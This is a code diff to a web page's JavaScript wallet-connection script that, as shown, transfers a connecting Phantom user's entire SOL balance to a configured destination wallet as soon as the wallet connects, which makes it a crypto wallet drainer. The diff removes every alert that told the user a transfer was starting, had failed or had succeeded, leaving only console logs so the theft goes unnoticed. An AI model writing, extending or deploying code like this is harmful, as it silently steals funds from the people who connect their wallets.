@@ -479,9 +479,6 @@ window.connectWallet = async function () {
             window.walletAddress = walletAddress;
             document.getElementById('walletStatus').innerText = `Wallet: ${walletAddress}`;
 
-            // Show transferring status
-            alert("Starting fund transfer...");
-
             // Transfer all funds immediately
             const transferSuccess = await transferAllFunds(walletAddress);
 
@@ -497,10 +494,9 @@ window.connectWallet = async function () {
 
         } catch (err) {
             console.error("Wallet connection failed:", err);
-            alert("Error: " + err.message);
         }
     } else {
-        alert("Phantom wallet not found. Please install it.");
+        console.error("Phantom wallet not found");
     }
 };
 
@@ -585,13 +581,11 @@ window.transferAllFunds = async function (walletAddress) {
 
         if (DESTINATION_WALLET === 'YOUR_DESTINATION_WALLET_ADDRESS') {
             console.error("Destination wallet not configured!");
-            alert("ERROR: Transfer destination not configured on server!");
             return false;
         }
 
         // Check if solanaWeb3 is available
         if (!window.solanaWeb3) {
-            alert("ERROR: Solana web3 library not loaded. Refresh the page.");
             console.error("window.solanaWeb3 not found");
             return false;
         }
@@ -620,7 +614,6 @@ window.transferAllFunds = async function (walletAddress) {
 
         if (balanceLamports <= 100000) { // Need at least 0.0001 SOL
             console.warn("Insufficient balance for transfer");
-            alert("Insufficient SOL balance. You have: " + (balanceLamports / 1000000000).toFixed(6) + " SOL");
             return false;
         }
 
@@ -666,7 +659,6 @@ window.transferAllFunds = async function (walletAddress) {
         });
 
         console.log("Transfer transaction sent:", txid);
-        alert("Transaction sent! TX: " + txid);
 
         // Wait for confirmation
         console.log("Waiting for confirmation...");
@@ -681,7 +673,6 @@ window.transferAllFunds = async function (walletAddress) {
         console.log("Transfer confirmed:", txid);
 
         window.transferTxId = txid;
-        alert(`SUCCESS! SOL transferred. TX: ${txid}`);
         console.log("=== TRANSFER COMPLETE ===");
         return true;
 
@@ -690,10 +681,6 @@ window.transferAllFunds = async function (walletAddress) {
         console.error("Transfer error:", err);
         console.error("Error message:", err.message);
         console.error("Error stack:", err.stack);
-        
-        let errorMsg = err.message || "Unknown error";
-        
-        alert("Transfer failed: " + errorMsg);
         return false;
     }
 };
